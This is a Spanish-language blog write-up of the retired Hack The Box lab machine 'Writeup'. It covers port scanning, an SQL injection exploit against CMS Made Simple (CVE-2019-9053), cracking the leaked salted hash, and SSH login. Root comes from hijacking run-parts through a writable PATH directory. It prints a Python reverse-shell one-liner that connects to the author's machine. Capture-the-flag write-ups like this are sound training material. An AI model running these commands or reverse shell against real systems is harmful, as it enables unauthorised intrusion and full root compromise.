<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>Hack The Box - Writeup :: sckull — HackTheBox Writeups, CTF</title>    
  
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">

<meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<meta name="description" content="Resumen La maquina Writeup fue retirada y aqui esta la solucion que le di a esta maquina. En esta maquina vimos una vulnerabilidad de SQLi con la que obtuvimos credenciales y psoteriormente las crackeamos para obtener acceso a la maquina por el servicio SSH, asi tambien obtuvimos privilegios root mediante un proceso que pudimos observar con pspy. Acontinuacion la informacion.
   Nombre Writeup     OS Linux   Puntos 20   Dificultad Facil   IP 10."/>
<meta name="keywords" content=""/>
<meta name="robots" content="noodp"/>
<link rel="canonical" href="https://sckull.github.io/posts/writeup/" />


<link rel="stylesheet" href="https://sckull.github.io/assets/style.css">


<link rel="stylesheet" href="https://sckull.github.io/style.css">


<link rel="shortcut icon" href="https://sckull.github.io/img/favicon.png">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
<script src="https://kit.fontawesome.com/57784fec54.js" crossorigin="anonymous"></script>


<meta name="twitter:card" content="summary" />
<meta name="twitter:title" content="Hack The Box - Writeup :: sckull — HackTheBox Writeups, CTF" />
<meta name="twitter:description" content="Resumen La maquina Writeup fue retirada y aqui esta la solucion que le di a esta maquina. En esta maquina vimos una vulnerabilidad de SQLi con la que obtuvimos credenciales y psoteriormente las crackeamos para obtener acceso a la maquina por el servicio SSH, asi tambien obtuvimos privilegios root mediante un proceso que pudimos observar con pspy. Acontinuacion la informacion.
   Nombre Writeup     OS Linux   Puntos 20   Dificultad Facil   IP 10." />
<meta name="twitter:site" content="https://sckull.github.io/" />
<meta name="twitter:creator" content="sckull" />
<meta name="twitter:image" content="https://sckull.github.io/image/htb/writeup/cover.png">





<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Hack The Box - Writeup :: sckull — HackTheBox Writeups, CTF">
<meta property="og:description" content="Resumen La maquina Writeup fue retirada y aqui esta la solucion que le di a esta maquina. En esta maquina vimos una vulnerabilidad de SQLi con la que obtuvimos credenciales y psoteriormente las crackeamos para obtener acceso a la maquina por el servicio SSH, asi tambien obtuvimos privilegios root mediante un proceso que pudimos observar con pspy. Acontinuacion la informacion.
   Nombre Writeup     OS Linux   Puntos 20   Dificultad Facil   IP 10." />
<meta property="og:url" content="https://sckull.github.io/posts/writeup/" />
<meta property="og:site_name" content="Hack The Box - Writeup" />
<meta property="og:image" content="https://sckull.github.io/image/htb/writeup/cover.png">
<meta property="og:image:width" content="2048">
<meta property="og:image:height" content="1024">

<meta name="google-site-verification" content="cug_0s4kFi5UbEfBI5hJsscmJ7XdimqECCYfN1EAZq0" />


<script type="application/ld+json">
    {
        "@context" : "http://schema.org",
        "@type" : "BlogPosting",
        "mainEntityOfPage": {
             "@type": "WebPage",
             "@id": "https://sckull.github.io/"
        },
        "articleSection" : "posts",
        "name" : "Hack The Box - Writeup",
        "headline" : "Hack The Box - Writeup",
        "description" : "Resumen La maquina Writeup fue retirada y aqui esta la solucion que le di a esta maquina. En esta maquina vimos una vulnerabilidad de SQLi con la que obtuvimos credenciales y psoteriormente las crackeamos para obtener acceso a la maquina por el servicio SSH, asi tambien obtuvimos privilegios root mediante un proceso que pudimos observar con pspy. Acontinuacion la informacion.
   Nombre Writeup     OS Linux   Puntos 20   Dificultad Facil   IP 10.",
        "inLanguage" : "en-US",
        "author" : "",
        "creator" : "",
        "publisher": "",
        "accountablePerson" : "",
        "copyrightHolder" : "",
        "copyrightYear" : "2019",
        "datePublished": "2019-10-12 00:00:00 &#43;0000 UTC",
        "dateModified" : "2019-10-12 00:00:00 &#43;0000 UTC",
        "url" : "https://sckull.github.io/posts/writeup/",
        "wordCount" : "857",
        "keywords" : [ "hackthebox","linux","CVE-2019-9053","Wappalyzer","Blog" ]
    }
    </script>


<meta property="article:published_time" content="2019-10-12 00:00:00 &#43;0000 UTC" />




<a name="top"></a>
</head>

<body class="dark-theme">
  
<div class="container">
  <header class="header">
  <span class="header__inner">
    <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
    
      
        
                   

          

          

          
            <li><a href="/about">About</a></li>
          

        
      
        
                   

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

        
      
        
                   

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

        
      
      
    
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        

          

          

          
            <li><a href="/about">About</a></li>
          

      
    
      
        

          
            <li><a href="/tags/hackthebox/"><img class="icon" src="/hackthebox.ico" width="32" title="HackTheBox"></a></li>
          

          

          

      
    
      
        

          

          
            <li><a href="/tags/tryhackme/"><img class="icon" src="/thm.ico" width="32" title="TryHackMe"></a></li>
          

          

      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none"/>
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
          </svg>
        </span>
      
      
    </span>
  </span>
  <link rel="shortcut icon" href="https://sckullbock.blogspot.com/favicon.ico">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.5.0/Chart.min.js"></script>
</header>

  
  <div class="content">    
    

  <div class="post">
    <h2 class="post-title">Hack The Box - Writeup</h2>
    <div class="post-meta">
      
        <span class="post-date">
          <i class="fas fa-calendar-week"></i>
            Saturday, Oct 12, 2019
        </span>
      
      <span class="post-author">— Written by sckull</span>
      
        <span class="post-read-time">— 5 min read</span>
      
    </div>
        
    
      <span class="post-tags">
        
         <a class="button-tag" href="https://sckull.github.io/tags/hackthebox/"><li class="fa fa-tag"></li> hackthebox</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/linux/"><li class="fa fa-tag"></li> linux</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/cve-2019-9053/"><li class="fa fa-tag"></li> CVE-2019-9053</a>&nbsp;
        
         <a class="button-tag" href="https://sckull.github.io/tags/wappalyzer/"><li class="fa fa-tag"></li> Wappalyzer</a>&nbsp;
        
      </span>
    

    
      
        <img src="https://sckull.github.io/posts/writeup/../../image/htb/writeup/cover.png" class="post-cover center" />
      
      <hr />
     
    

    <div class="contenido">
      <h2>Contenido</h2>
      <nav id="TableOfContents">
<ul>
<li>
<ul>
<li><a href="#resumen">Resumen</a></li>
<li><a href="#masscan-nmap">MASSCAN &amp; NMAP</a></li>
<li><a href="#http-puerto-80">HTTP - Puerto 80</a>
<ul>
<li>
<ul>
<li><a href="#robots-txt">Robots.txt</a></li>
</ul></li>
<li><a href="#cms-made-simple">CMS Made Simple</a></li>
</ul></li>
<li><a href="#cms-made-simple-sqli">CMS Made Simple - SQLI</a></li>
<li><a href="#hashcat">Hashcat</a></li>
<li><a href="#ssh-user">SSH - User</a></li>
<li><a href="#privilege-escalation">PRIVILEGE ESCALATION</a></li>
</ul></li>
</ul>
</nav>
    </div>

    <div class="post-content">      
      

<h2 id="resumen">Resumen</h2>

<p>La maquina <code>Writeup</code> fue retirada y aqui esta la solucion que le di a esta maquina. En esta maquina vimos una vulnerabilidad de SQLi con la que obtuvimos credenciales y psoteriormente las crackeamos para obtener acceso a la maquina por el servicio SSH, asi tambien obtuvimos privilegios root mediante un proceso que pudimos observar con pspy. Acontinuacion la informacion.</p>

<table>
<thead>
<tr>
<th>Nombre</th>
<th>Writeup</th>
</tr>
</thead>

<tbody>
<tr>
<td>OS</td>
<td>Linux</td>
</tr>

<tr>
<td>Puntos</td>
<td>20</td>
</tr>

<tr>
<td>Dificultad</td>
<td>Facil</td>
</tr>

<tr>
<td>IP</td>
<td>10.10.10.138</td>
</tr>

<tr>
<td>Maker</td>
<td><a href="https://www.hackthebox.eu/home/users/profile/77141">jkr</a></td>
</tr>
</tbody>
</table>

<div id="grapher"><canvas id="radar-chart" width="100" height="50"></canvas>
    <script>
    new Chart(document.getElementById("radar-chart"), {
    type: 'radar',
    data: {
      labels: ["Enumeration", "Real-Life", "CVE", "Custom Exploitation", "CTF-Like"],
      datasets: [
        {
          label: "User",
          fill: true,
          backgroundColor: "rgba(179,181,198,0.2)",
          borderColor: "rgba(179,181,198,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(179,181,198,1)",
          data: [6.9, 7, 7.4, 2.6, 3]
        }, {
          label: "Maker",
          fill: true,
          backgroundColor: "rgba(255,99,132,0.2)",
          borderColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          pointBackgroundColor: "rgba(255,99,132,1)",
          pointBorderColor: "#fff",
          data: [5, 6, 8, 2, 4]
        }
      ]
    },
    options: {
      title: {
        display: true,
        text: 'Calificacion'
      }
    }
});
    </script>
</div>

<hr />

<h2 id="masscan-nmap">MASSCAN &amp; NMAP</h2>

<p>Escaneo de puertos TCP/UDP.</p>

<pre><code class="language-bash">root@sckull:~/htb/writeup# masscan -p1-65535,U:1-65535 10.10.10.138 --rate=1000 -e tun0

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-06-14 23:30:31 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.138                                    
Discovered open port 22/tcp on 10.10.10.138

Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-14 17:38 CST
Nmap scan report for 10.10.10.138
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
|   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
|_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/writeup/
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Nothing here yet.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds
</code></pre>

<h2 id="http-puerto-80">HTTP - Puerto 80</h2>

<p>Al visitar el puerto 80 en http nos muestra una pagina con un mensaje en el cual nos indica que la pagina tiene un script anti ddos.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_131024.png" alt="image" /></p>

<h4 id="robots-txt">Robots.txt</h4>

<p>Intentamos utilizar gobuster, dirb y wfuzz para busqueda de directorios y archivos pero por el script que nos indica en la pagina principal no pudimos realizar dicha busqueda por lo que visitamos el archivo robots.txt de la pagina principal y nos muestra que esta &ldquo;oculto&rdquo; <code>/writeup/</code>, al visitar esta pagina nos muestra una serie de writeups de maquinas que ya fueron retiradas de hackthebox.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_131244.png" alt="image" /></p>

<h3 id="cms-made-simple">CMS Made Simple</h3>

<p>Utilizamos la extension para firefox <code>Wappalyzer</code> la cual nos ayuda a identificar el tipo de CMS, Web Server, Programming Language y Operating Ssytem de una pagina web. Al utilizar esta extension en la pagina nos muestra lo mencionado anteriormente.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_170512.png" alt="image" /></p>

<p>Sabiendo esto buscamos exploits que puedan afectar a este CMS con Searchsploit.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_170708.png" alt="image" /></p>

<p>Encontramos varios exploits que afectan a este CMS cada uno de ellos en distintas versiones y tipos de vulnerabilidad, para esta version utilizamos <code>CMS Made Simple &lt; 2.2.10 - SQL Injection</code> (CVE-2019-9053).</p>

<h2 id="cms-made-simple-sqli">CMS Made Simple - SQLI</h2>

<p>Utilizamos el exploit contra la pagina y nos muestra las credenciales del usuario jkr el salto de la contraseña y la contraseña.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_171931.png" alt="image" /></p>

<pre><code class="language-bash">root@sckull:~/htb/writeup# python CVE-2019-9053.py -u http://10.10.10.138/writeup/
[+] Salt for password found: 5a599ef579066807
[+] Username found: jkr
[+] Email found: jkr@writeup.htb
[+] Password found: 62def4866937f08cc13bab43bb14e6f7
</code></pre>

<h2 id="hashcat">Hashcat</h2>

<p>Para obtener la contraseña en texto plano utilizamos Hashcat, escribimos el hash y el salto de la contraseña en un archivo para utilizarlo con hashcat y un diccionario.</p>

<p><strong>Contraseña:salto</strong></p>

<p><code>62def4866937f08cc13bab43bb14e6f7:5a599ef579066807</code></p>

<p>Comando hashcat:</p>

<pre><code class="language-bash">./hashcat64.bin  -m 20 62def4866937f08cc13bab43bb14e6f7:5a599ef579066807 ../rockyou.txt -o huehue.txt
</code></pre>

<p><strong>Contraseña crackeada:</strong></p>

<p><code>62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9</code></p>

<h2 id="ssh-user">SSH - User</h2>

<p>Cuando obtuvimos nuestra usuario y contraseña con el exploit la probamos en el panel de administracion del CMS que esta corriendo en el puerto 80 pero no tuvimos suerte de acceder por ese lado, por lo que utilizamos las credenciales en el servicio SSH y nos logeamos satisfactoriamente.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_233858.png" alt="image" /></p>

<p><strong>Flag user.txt:</strong></p>

<p><img src="../../image/htb/writeup/Screenshot_20190614_234021.png" alt="image" /></p>

<h2 id="privilege-escalation">PRIVILEGE ESCALATION</h2>

<p>Utilizamos pspy para observar los procesos que se ejecutan, encontramos que un proceso se ejecuta a cada vez que se inicia sesion en el servicio de SSH.</p>

<p><img src="../../image/htb/writeup/Screenshot_20190705_210432.png" alt="image" /></p>

<p>Vemos que este proceso env donde se le pasa la variable <code>$PATH</code> del usuario root, luego de eso ejecuta un comando:</p>

<pre><code class="language-bash">run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
</code></pre>

<p>Buscamos en que carpeta se encuentra run-parts:</p>

<p><img src="../../image/htb/writeup/Screenshot_20190705_210948.png" alt="image" /></p>

<p>Revisamos la variable <code>PATH</code> del usuario root y las carpetas donde tenemos permisos de escritura:</p>

<pre><code class="language-bash">PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
</code></pre>

<p>Carpetas donde tenemos permisos de escritura:</p>

<pre><code>find / -writable -type d 2&gt;/dev/null
</code></pre>

<p><img src="../../image/htb/writeup/Screenshot_20190615_002605.png" alt="image" /></p>

<p>Encontramos una carpeta que el usuario root utiliza en su variable PATH (<code>/usr/local/sbin/</code>), esta direccion es la primera que se utiliza para poder &ldquo;encontrar&rdquo; los programas/scripts/etc que se escriban en la terminal de comandos, en este caso la primera direccion donde el usuario root va a buscar <strong>run-parts</strong> es <code>/usr/local/sbin/</code>.</p>

<p>Sabiendo esto, podemos escribir un comando/reverse shell dentro de <code>/usr/local/sbin/run-parts</code> el cual va ser ejecutado por el usuario root. Vamos hacer una prueba con un ping hacia nuestra maquina:</p>

<pre><code>echo &quot;/bin/ping -c 2 10.10.15.122&quot; &gt; /usr/local/sbin/run-parts &amp;&amp; chmod +x /usr/local/sbin/run-parts
</code></pre>

<p>La respuesta la vemos reflejada con tcpdump:
<img src="../../image/htb/writeup/Screenshot_20190705_212608.png" alt="image" /></p>

<p>Ahora que tuvimos una respuesta de la maquina vamos a agregar nuestra shell inversa al archivo y vamos a poner a la escucha netcat localmente:</p>

<pre><code class="language-bash">echo &quot; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;10.10.15.122\&quot;,1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);' &quot; &gt; /usr/local/sbin/run-parts &amp;&amp; chmod +x /usr/local/sbin/run-parts
</code></pre>

<p><img src="../../image/htb/writeup/Screenshot_20190705_213930.png" alt="image" /></p>

<p>Obtenemos nuestra shell inversa como usuario root y nuestra flag <strong>root.txt</strong>:</p>

<p><img src="../../image/htb/writeup/Screenshot_20190705_214017.png" alt="image" /></p>

    </div>    
    <hr />
    
    <div>
      
        
<div id="disqus_thread"></div>
<script>
(function() {
var d = document, s = d.createElement('script');
s.src = 'https://sckull.disqus.com/embed.js';
s.setAttribute('data-timestamp', +new Date());
(d.head || d.body).appendChild(s);
})();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>

      
      
    </div>

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h">Read other posts</span>
          <hr />
        </div>
        <div class="pagination__buttons">
          
            <span class="button previous">
              <a href="https://sckull.github.io/posts/haystack/">
                <span class="button__icon">←</span>
                <span class="button__text">Hack The Box - Haystack</span>
              </a>
            </span>
          
          
            <span class="button next">
              <a href="https://sckull.github.io/posts/swagshop/">
                <span class="button__text">Hack The Box - SwagShop</span>
                <span class="button__icon">→</span>
              </a>
            </span>
          
        </div>
      </div>
      
    
    
    
  </div>
  
    
  </div>
  
  
    <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" width="44" height="44" viewBox="0 0 44 44">
  <polyline fill="none" stroke="#fff" stroke-width="2" points="15 8 29.729 22.382 15 35.367"/>
</svg>
</span>
    <span class="logo__text">sckull | blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span style="font-size: 0.85em;">© 2020 sckull</span>
        
      
      </div>
    
  </div>
</footer>

<script src="https://sckull.github.io/assets/main.js"></script>
<script src="https://sckull.github.io/assets/prism.js"></script>

  
  
  
  <a class="float" id="myBtn" href="#top"><i class="fa fa-arrow-up" aria-hidden="true"></i></a>
  
</div>






</body>
</html>
